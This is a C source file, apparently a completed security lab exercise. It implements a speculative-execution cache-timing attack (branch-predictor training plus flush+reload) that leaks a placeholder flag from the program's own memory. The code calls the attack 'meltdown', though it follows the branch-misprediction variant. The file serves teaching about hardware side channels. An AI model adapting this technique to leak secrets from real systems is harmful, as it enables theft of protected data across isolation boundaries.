#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#include <assert.h>

#include <unistd.h>

#include <sys/mman.h>

#include <x86intrin.h>


#define FLAG "THIS_IS_THE_FLAG"
#define FLAG_SIZE (16)


// cache scratchpad array type, each element sized 0x1000 (4096 bytes)
typedef struct Array {
    char data[0x1000];
} Array;
//we will use this as 256 items

// used for flush-reload
volatile Array *scratchpad;

// used for branch predictor
volatile Array *temp_scratchpad;

// memory!
volatile uint64_t *branch_variable;

// some secret string
volatile char *secret_data;


/* Some function definitions... */
// memory mapping...
void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

void
setup_secret(void) {
    secret_data = mmap_size(0x1000);
    memcpy((void*)secret_data, FLAG, FLAG_SIZE);
}


// allocate all memory
void
alloc_memory(void) {
    // allocate cache scratchpad
    scratchpad = mmap_size(sizeof(Array) * 256);

    // another scratchpad for training branch predictor
    temp_scratchpad = mmap_size(sizeof(Array) * 256);

    // a branch variable memory block..
    branch_variable = mmap_size(0x1000);
}



// do meltdown; a template..
int meltdown_logic(uint64_t *branch_variable, char *target_array,
                    Array *cachepad, uint64_t idx) {
    volatile int i = 0;


    // flush branch variable from cache
    _mm_clflush(branch_variable);
    _mm_mfence();
    if (*branch_variable) {
        // excute the following line speculatively
        // will access cachepad indexed by secret[idx]
        i += cachepad[target_array[idx]].data[0];
    }
    return i;
}




// flush all scratchpad data
void
flush_all() {
    // TODO: flush all from scratchpad..
    for (int i=0; i<256; ++i) {
        _mm_clflush(&scratchpad[i].data[0]);
    }

    // Don't forget to add mfence after flush all..
    _mm_mfence();
}


// reload and get the fastest timing index; also returns timing
uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;

    // TODO: return minimum timing index and timing (via p_timing)
    // while reloading blocks from scratchpad
    volatile uint64_t t1, t2;
    uint64_t diff;
    volatile char c;
    uint32_t a;

    for(int i = 0; i < 256; i++){
        t1 = __rdtscp(&a);
        c = scratchpad[i].data[0];
        _mm_lfence();
        t2 = __rdtscp(&a);
        diff = t2 - t1;

        if(diff < min_timing){
            min_timing = diff;
            min_idx = i;
        }
    }

    *p_timing = min_timing;

    return min_idx;
}





void
meltdown() {
    // TODO: Launch meltdown here..
    /*
     * Algorithm
     *
     * for 16 secret characters:
     *  1) train branch predictor to take 'true' branch by using fake data, run 1000 times
     *  2) flush all cache from scratchpd
     *  3) load secret data to cache (read to a volatile variable)
     *  4) run meltdown
     *  5) reload cache, measure timing, and figure out a byte value of the secret
     *  6) repeat..
     *
     */


    char buffer[20];
    memset(buffer, 0, 20);

    volatile char * c;

    for (int i = 0; i < 16; ++i){


        usleep(1000);

        //train
        *branch_variable = 1;
        for(int j = 0; j < 1000; j++){
            meltdown_logic(branch_variable, buffer, temp_scratchpad, 0);
        }
        //flush all
        flush_all();
        //cache secret data;
        c = *secret_data;

        _mm_lfence();

        //int meltdown_logic(uint64_t *branch_variable, char *target_array, Array *cachepad, uint64_t idx) {

        *branch_variable = 0;
        //meltdown_logic(branch_variable, secret_data, scratchpad, i);
        for(int j = 0; j < 1000; j++){
            meltdown_logic(branch_variable, secret_data, scratchpad, i);
        }



        uint64_t min_timing = 0;
        uint64_t min_idx = reload_fastest(&min_timing);
        //expecting l1 chache in under 100 cycles

        if (min_timing > 100){
            //We failed here
            i--;
            continue;
        }
        buffer[i] = (char)(min_idx &0xff);

        printf("Secret is %s\n", buffer);
    }
}

int
main() {
    setup_secret();
    alloc_memory();
    meltdown();
    return 0;
}
